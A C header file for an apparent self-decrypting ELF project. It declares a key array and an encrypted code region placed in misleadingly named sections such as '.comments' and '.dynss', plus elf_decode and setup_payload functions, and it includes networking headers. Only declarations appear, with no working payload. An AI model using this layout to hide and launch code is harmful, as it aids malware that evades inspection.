
#ifndef ELF_UTILS_H
#define ELF_UTILS_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <time.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <elf.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>

#define ELF_KEY (".dynss")
#define ELF_CODE (".comments")
#define ELF_BOOL (".consts")

/*
   To get the func section size, we can use
        size -d -A --radix=16 [binary]
    to get ELF_CODE's section size.

    Warning: If the binary is packed,
    there will be no sections left.
*/
#define ELF_FUNC_SIZE (0x6b2)

#include "setup.h"
__attribute((section(ELF_BOOL))) static bool is_first_time = true;
__attribute((section(ELF_KEY))) static char key[ELF_FUNC_SIZE] = {0};

#define ELF_NAMELEN (512)

typedef struct bin_s {
    char name[ELF_NAMELEN];
    unsigned int len;
    unsigned char *content;
} elf_bin_t;

typedef struct utl_s {
    int s_offset;
    int s_len;
    elf_bin_t bin;
} elf_utils_t;

// elf.c
elf_utils_t *elf_read(char const *);
void elf_decode(elf_utils_t *);

// payload.c
void setup_payload(void);

#endif // ELF_UTILS_H
